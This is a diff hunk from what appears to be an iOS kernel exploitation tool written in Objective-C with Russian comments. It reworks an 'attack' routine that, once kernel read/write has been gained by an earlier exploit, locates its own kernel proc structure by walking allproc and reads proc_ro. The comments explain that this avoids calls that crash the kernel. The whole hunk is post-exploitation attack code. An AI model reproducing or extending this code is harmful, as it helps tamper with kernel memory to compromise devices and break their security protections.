@@ -2304,8 +2304,10 @@ static NSString *kpFmtSptmFn(uint64_t raw)
         [r appendString:@"[RESULT] АТАКА: FAIL — KRW не активна, сначала эксплойт.\n"];
         return r;
     }
-    uint64_t selfProc = proc_self();
-    if (!kpLooksLikeKernelPointer(selfProc)) selfProc = [self findSelfProcByPidFast:(uint32_t)getpid() log:r];
+    // 2.0.50: proc_self() НЕ зовём — его цепь (1:1 kutils) кидает мусор в
+    // kread (FATAL 0x3e8/0x18 в каждом логе) и лотереей убивает ядро.
+    // Свой proc берём только safe-walk'ом по allproc.
+    uint64_t selfProc = [self findSelfProcByPidFast:(uint32_t)getpid() log:r];
     // findProcByPid намеренно не используем — его EXP-01 zone-route валит девайс
     if (!selfProc) { [r appendString:@"[RESULT] АТАКА: FAIL — свой proc не найден\n"]; return r; }
     uint64_t procRo = kp_untag_ptr(early_kread64(selfProc + koffsetof(proc, proc_ro)));
